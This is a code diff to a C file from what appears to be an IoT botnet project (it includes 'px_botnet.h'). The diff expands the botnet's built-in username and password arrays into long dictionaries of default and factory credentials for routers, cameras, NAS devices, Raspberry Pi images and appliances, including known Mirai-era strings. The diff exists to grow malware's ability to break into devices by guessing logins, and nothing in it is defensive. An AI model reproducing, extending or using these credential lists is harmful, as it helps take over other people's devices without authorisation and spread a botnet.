@@ -1,7 +1,44 @@
 #include "../includes/px_botnet.h"
 
-char *usernames[] = {"root\0", "admin\0", "user\0", "login\0", "guest\0", "support\0", "ubnt\0", "\0"};
-char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "ubnt\0", "7ujMko0vizxv\0", "1234\0", "12345\0", "123456\0", "default\0", "\0", "password\0", "support\0", "volatilechangeme123"};
+char *usernames[] = {
+    "root\0", "administrator\0", "NetLinx\0", "amx\0", "admin\0",
+    "Administrator\0", "cisco\0", "c-comatic\0", "pi\0", "user\0",
+    "leo\0", "localadmin\0", "fwupgrade\0", "apc\0", "device\0",
+    "eurek\0", "netscreen\0", "cirros\0", "vagrant\0", "m202\0",
+    "demo\0", "maint\0", "debian\0", "myshake\0", "stackato\0",
+    "default\0", "ftp\0", "nexthink\0", "ubnt\0", "sansforensics\0",
+    "elk_user\0", "osboxes\0", "sans\0", "user\0", "misp\0",
+    "hxeadm\0", "acitoolkit\0", "osbash\0", "enisa\0", "geosolutions\0",
+    "pyimagesearch\0", "remnux\0", "hunter\0", "plexuser\0", "openhabian\0",
+    "public\0", "hipchat\0", "nao\0", "support\0", "USERID\0",
+    "Administrator\0", "admin1\0", "administrator\0", "666666\0", "888888\0",
+    "tech\0", "guest\0", "login\0", "password\0", "telnet\0",
+    "88888888\0", "klv1234\0", "hi3518\0", "jvbzd\0", "ikwb\0",
+    "dreambox\0", "realtek\0", "00000000\0", "54321\0", "123456\0",
+    "S2fGqNFs\0", "OxhlwSG8\0", "antslq\0", "tlJwpbo6\0", "taZz@23495859\0",
+    "20080826\0", "gforge\0", "zsun1188\0", "synnet\0", "t0talc0ntr0l4!\0",
+    "fliradmin\0", "12345678\0", "1234567890\0", "vertex25ektks123\0", "admin@mymifi\0",
+    "meinsm\0", "cat1029\0"
+};
+char *passwords[] = {
+    "calvin\0", "password\0", "Amx1234!\0", "1988\0", "Vision2\0",
+    "insecure\0", "raspberry\0", "default\0", "rootpasswd\0", "p@ck3tf3nc3\0",
+    "12345\0", "cubswin\0", "ucLinux\0", "alpine\0", "dottie\0",
+    "arcsight\0", "unitrends1\0", "vagrant\0", "fai\0", "palosanto\0",
+    "ubuntu1404\0", "cubox-i\0", "sipwise\0", "screencast\0", "stxadmin\0",
+    "nosoup4u\0", "indigo\0", "video\0", "ubnt\0", "forensics\0",
+    "osboxes.org\0", "training\0", "Password1234\0", "HXEHana1\0", "osbash\0",
+    "enisa\0", "Geos\0", "deeplearning\0", "malware\0", "rasplex\0",
+    "plex\0", "openmediavault\0", "ys123456\0", "libreelec\0", "ManagementConsole2015\0",
+    "publicpass\0", "symantec\0", "max2play\0", "pfsense\0", "root01\0",
+    "nas4free\0", "PASSW0RD\0", "p@ssw0rd\0", "freenas\0", "cxlinux\0",
+    "symbol\0", "superuser\0", "admin123\0", "D13HH[\0", "blackarch\0",
+    "dasdec1\0", "7ujMko0vizxv\0", "Zte521\0", "zlxx.\0", "compass\0",
+    "samurai\0", "ubuntu\0", "openvpnas\0", "wazuh\0", "password123\0",
+    "reverse\0", "PrOw!aN_fXp\0", "usuario\0", "admin1234\0", "vizxv\0",
+    "anko\0", "supervisor\0", "1234567\0", "1234\0", "12345\0",
+    "pass\0", "changeme\0", "volatilechangeme123\0"
+};
 
 int sclose(int fd)
 {
